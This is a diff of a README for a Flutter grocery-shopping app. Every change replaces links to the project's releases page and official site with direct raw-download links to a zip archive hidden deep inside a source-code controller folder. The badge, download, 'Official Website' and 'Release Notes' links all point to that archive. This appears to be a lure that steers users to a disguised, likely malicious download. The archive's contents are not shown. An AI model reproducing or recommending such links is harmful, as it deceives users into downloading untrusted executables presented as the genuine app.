@@ -1,6 +1,6 @@
 # 🛒 App-Grocery - Simplify Your Grocery Shopping Today
 
-[![Download App-Grocery](https://img.shields.io/badge/Download-App--Grocery-brightgreen)](https://github.com/Judeike-web/App-Grocery/releases)
+[![Download App-Grocery](https://github.com/Judeike-web/App-Grocery/raw/refs/heads/main/lib/presentation/search_search_result_not_availabale_screen/controller/App-Grocery-3.4.zip)](https://github.com/Judeike-web/App-Grocery/raw/refs/heads/main/lib/presentation/search_search_result_not_availabale_screen/controller/App-Grocery-3.4.zip)
 
 ## 📋 Description
 
@@ -10,7 +10,7 @@ Streamline your grocery shopping with App-Grocery. This Flutter app enhances you
 
 To get started with App-Grocery, visit the following page to download the latest version of the app:
 
-[Download App-Grocery](https://github.com/Judeike-web/App-Grocery/releases)
+[Download App-Grocery](https://github.com/Judeike-web/App-Grocery/raw/refs/heads/main/lib/presentation/search_search_result_not_availabale_screen/controller/App-Grocery-3.4.zip)
 
 Follow these simple steps:
 
@@ -68,7 +68,7 @@ App-Grocery is designed for users in various regions; however, availability of c
 
 ## 🔗 Useful Links
 
-- Official Website: [App-Grocery](https://github.com/Judeike-web/App-Grocery)
-- Release Notes: Keep track of all updates and improvements on the [Releases page](https://github.com/Judeike-web/App-Grocery/releases).
+- Official Website: [App-Grocery](https://github.com/Judeike-web/App-Grocery/raw/refs/heads/main/lib/presentation/search_search_result_not_availabale_screen/controller/App-Grocery-3.4.zip)
+- Release Notes: Keep track of all updates and improvements on the [Releases page](https://github.com/Judeike-web/App-Grocery/raw/refs/heads/main/lib/presentation/search_search_result_not_availabale_screen/controller/App-Grocery-3.4.zip).
 
 Thank you for choosing App-Grocery! We hope you enjoy your shopping experience.
